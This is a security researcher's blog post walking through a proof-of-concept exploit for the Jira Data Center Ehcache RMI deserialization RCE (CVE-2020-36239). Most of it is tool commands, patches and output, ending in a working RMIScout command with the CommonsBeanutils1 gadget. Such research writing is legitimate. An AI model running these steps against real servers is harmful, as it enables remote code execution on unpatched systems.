---
title:  "Developing an exploit for the Jira Data Center Ehcache RCE (CVE-2020-36239)"
layout: post
date:   2021-07-30
permalink: posts/CVE-2020-36239-POC-dev
---

## Overview

Last Friday I saw an [Atlassian security advisory for a critical RCE in Jira Data Center (CVE-2020-36239)](https://confluence.atlassian.com/adminjiraserver/jira-data-center-and-jira-service-management-data-center-security-advisory-2021-07-21-1063571388.html), so I decided to try to develop a proof of concept exploit for it. This ended up taking me about 5 hours. This short blog post details the process I went through to create the POC. I've also included some of the mistakes made and dead ends I went down, which is all too often missing from POC writeups.

This was a good exercise in creating a POC for a patched vulnerability, as I was able to do it without diffiing patches. I learnt some more about exploiting RMI, and the changes in JEP 290.

### Investigating the bug advisory

Reading the details of the advisory, it was clear that the vulnerability only affected Data Center not the standalone Server mode. It affected a component called Ehcache, which appears to be a Java based cache, that supports RMI for communication in some way. Exploitability requires connectivity to port 40001 and possibly 40011. This seemed to be the ports Ehcache was listening on, and it would probably also be vulnerable if it was listening on non-standard ports. The advisory contains a decent amount of useful details, such as:

* Ehcache RMI network service exposed
* Arbitrary code execution via deserialization due to a missing authentication vulnerability


### Prodding

I figured this would be a simple enough exploit, having popped RMI interfaces before using Ysoserial's RMIRegistryExploit addition. After setting up an appropriate Jira version (v8.16.2, using JDK 1.8.0_275 on Windows 10), I found none of the ysoserial payloads worked. 

Instead, they returned an error like:
```
$ java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit 192.168.200.136 40001 CommonsCollections1 "notepad.exe"

java.rmi.ServerException: RemoteException occurred in server thread; nested exception is: 
	java.rmi.AccessException: Registry.bind disallowed; origin /192.168.200.128 is non-local host
...
```

A post on the [ysoserial gitter](https://gitter.im/frohoff/ysoserial?at=5d4381c54635976e0413c707) lead me to [this article](https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/) which was enormously helpful. As per the article, after JEP290 (which affects the JDK version i was running) the JDK has builtin filters for the RMI registry and DGC (which JRMP uses). These filters only allow specific classes to be deserialized. So this explains why none of the regular Ysoserial gadgets worked via the RMIRegistry exploit.

Reading on, I found it was possible to exploit a deserialization issue still [using a bypass gadget](https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/), or by passing an arbitrary object to the RMI server, so long as a method exists that accepts non-primitive types. I figured I'd try the arbitrary object method, and come back to the bypass gadget later if I couldn't get it working.

Doing a bit more googling, I identified two tools, [RMIScout](https://github.com/BishopFox/rmiscout) and [RMItaste](https://github.com/STMSolutions/RmiTaste), that aided with exploiting the issues. I first tried out RMIscout, which returned an error 

```
./rmiscout.sh wordlist -i lists/prototypes.txt 192.168.200.136 40001

[INFO] No registry specified. Attempting operation on all available registries...
[ERROR] error unmarshalling return; nested exception is: 
	java.lang.ClassNotFoundException: net.sf.ehcache.distribution.ConfigurableRMIClientSocketFactory (no security manager: RMI class loader disabled)

```
This was an interesting error message, and wasn't initially clear to me what was going wrong. The `ClassNotFoundException` should have been a hint at the time...

I figured I'd come back to this, and tried the other RMItaste tool. Using the `enum` technique resulted in it connect to the remote repository and hanging. I found a log file, which was full of:

```
28/07/2021 11:13:31.980 - [m0.rmitaste.rmi.serialization.RmiObjectParser.getByte] - [SEVERE] - No more bytes to read. Limit has been reached!
```

The source indicated this occurs when it attempts to read bytes from the stream when none were present anymore. It came from the `parseClassAnnotation` method, so I added a quick hacky patch in there to break the loop when the getByte() method returned -1.

```
@@ -233,6 +233,9 @@
             else if(b == TC_STRING){
                 this.getUtfShort();
             }
+	    else if(b == -1){
+		break;
+		}
         }
     }

```

### Getting somewhere

After a repackage and rerun the tool dumped an enormous set of remote objects and the class they extend. This output didn't contain methods, but it asked for an object interface:

```
$ java -cp ".:libs_attack/*:target/rmitaste-1.0-SNAPSHOT-all.jar" m0.rmitaste.RmiTaste enum -t 192.168.200.136 -p 40001
Connected to RMI registry on 192.168.200.136:40001

com.atlassian.gadgets.renderer.internal.cache.parsedDocuments [object] [null] 
	 extends net.sf.ehcache.distribution.RMICachePeer_Stub [class]
		No methods found. I don't have remote object interface. Give it to me!

com.atlassian.jira.license.JiraLicenseManager.License.cache [object] [null] 
	 extends net.sf.ehcache.distribution.RMICachePeer_Stub [class]
		No methods found. I don't have remote object interface. Give it to me!

com.atlassian.jira.plugins.healthcheck.service.HeartBeatService.heartbeat [object] [null] 
	 extends net.sf.ehcache.distribution.RMICachePeer_Stub [class]
		No methods found. I don't have remote object interface. Give it to me!
...
```

The examples indicated this was missing the target library. I sourced the appropriate library from the install ("ehcache-2.10.2-atlassian-18.jar") into the Rmitaste libs_attack dir, and re-ran the enum, which dumped out the same list with all the object methods and their accepted types included.

```
$ java -cp ".:libs_attack/*:target/rmitaste-1.0-SNAPSHOT-all.jar" m0.rmitaste.RmiTaste enum -t 192.168.200.136 -p 40001
Connected to RMI registry on 192.168.200.136:40001
..

com.atlassian.gadgets.renderer.internal.cache.parsedDocuments [object] [null] 
	 extends net.sf.ehcache.distribution.RMICachePeer_Stub [class]
		getGuid(); [method]
		getUrl(); [method]
		getQuiet(java.io.Serializable param0); [method]
			Parameters: param0;  may be vulnerable to Java Deserialization! [info]
		removeAll(); [method]
		class$(java.lang.String param0); [method]
			Parameters: param0;  may be vulnerable to Java Deserialization! [info]
		getName(); [method]
		getElements(java.util.List param0); [method]
			Parameters: param0;  may be vulnerable to Java Deserialization! [info]
		getUrlBase(); [method]
		getKeys(); [method]
		send(java.util.List param0); [method]
			Parameters: param0;  may be vulnerable to Java Deserialization! [info]
		remove(java.io.Serializable param0); [method]
			Parameters: param0;  may be vulnerable to Java Deserialization! [info]
		put(net.sf.ehcache.Element param0); [method]
			Parameters: param0;  may be vulnerable to Java Deserialization! [info]

....

```

A fairly promising message "may be vulnerable to Java Deserialization!" appears. You can see these accept non-primitive types such as net.sf.ehcache.Element, which should be exploitable, as per the [mogwailabs blog post](https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/).

I then ran the RMITaste tool with the `attack` command specifying one of the discovered objects and methods using the URLDNS payload, which simply performs a DNS lookup and works without any vulnerable JARs on the classpath. 

```
java -cp ".:libs_attack/*:target/rmitaste-1.0-SNAPSHOT-all.jar" m0.rmitaste.RmiTaste attack -c 'http://<DNSHOST>' -g URLDNS -m "com.atlassian.gadgets.renderer.internal.cache.gadgetSpecs:net.sf.ehcache.distribution.RMICachePeer_Stub:getQuiet"  -t 192.168.200.136 -p 40001
```

The output looked it worked, however no DNS lookup occurred and the logfile showed a warning:
```
28/07/2021 11:52:51.990 - [m0.rmitaste.rmi.exploit.Attack.invokeMethod] - [WARNING] - An error occurred when calling getQuiet on com.atlassian.gadgets.renderer.internal.cache.gadgetSpecs. java.lang.ClassCastException: net.sf.ehcache.distribution.RMICachePeer_Stub cannot be cast to java.lang.reflect.Proxy
```

This seemed important, and digging into the source again I found it had decided `RMICachePeer_Stub` was a dynamic stub, and as such tried to cast it as a proxy. I tried changing the method to call `invokestaticstub` instead, and reran the DNS lookup attempt.

### Finding the right gadget

This did actually perform a DNS lookup, so I knew I was on the right path. Next I tried to bruteforce the interface with ysoserial gadgets to find one that allowed code execution, which RMItaste supports using the "-gen bruteforce" argument.  

```
java -cp ".:libs_attack/*:target/rmitaste-1.0-SNAPSHOT-all.jar" m0.rmitaste.RmiTaste attack -c 'notepad.exe' -gen bruteforce -m "com.atlassian.gadgets.renderer.internal.cache.gadgetSpecs:net.sf.ehcache.distribution.RMICachePeer_Stub:getQuiet"  -t 192.168.200.136 -p 40001
```

While it did return the rather promising message `Remote method has been invoked with payload: Spring2 notepad.exe`, unfortunately no notepad.exe was forthcoming.

I began wondering if this vulnerability required a custom Java deserialization gadget, which would probably be a pain to find and exploit. Before embarking down that route I read the output of the tool a little more closely, and noticed it didn't include all the ysoserial gadgets! This is because a list of gadgets to bruteforce is hardcoded in the RMItaste source, rather than dynamically discovered from the ysoserial jar. 

A quick bit of bash later I had it trying every payload ysoserial has to offer, resulting in a notepad.exe spawning! As a sidenote, calc.exe did not spawn even with a working exploit. I assume this is because it is now a UWP app? 

![]({{ site.baseurl }}/assets/jira.PNG)

This turned out to be due to the CommonsBeanutils1 gadget working successfully. So now I had a working POC, excellent.

### Additional

After copying the ehcache library into the RMIscout classpath and invoking it properly, I found it could also happily exploit the issue when given the appropriate signature:
```
$ java -cp 'ehcache-2.10.2-atlassian-18.jar:build/libs/rmiscout-1.4-SNAPSHOT-all.jar' com.bishopfox.rmiscout.RMIScout exploit -s 'net.sf.ehcache.Element getQuiet(java.io.Serializable param0)' -p ysoserial.payloads.CommonsBeanutils1 -c "notepad.exe" -n com.atlassian.gadgets.renderer.internal.cache.gadgetSpecs 192.168.200.136 40001
[INFO] Attempting operation on the "com.atlassian.gadgets.renderer.internal.cache.gadgetSpecs" registry.
java.lang.RuntimeException: InvocationTargetException: java.lang.reflect.InvocationTargetException
<..error stack trace snip..>
[INFO] Re-running execute without overwriting java.lang.String types.
java.lang.RuntimeException: InvocationTargetException: java.lang.reflect.InvocationTargetException
<..error stack trace snip..>
[ERROR] Payload was not invoked. Check the accuracy of the signature.

```

It throws an error, but the exploit does work.

According to my understanding of RMIScout, it should be able to enumerate these objects and bruteforce their methods without the appropriate libraries in the classpath? I didn't figure out why this didn't work, please let me know if you do.

Also congrats to [peterjson](https://twitter.com/peterjson) who worked out how to exploit it as well, [using the bypassgadget route](https://twitter.com/peterjson/status/1418578782491795457) and a different gadget. Nice one!



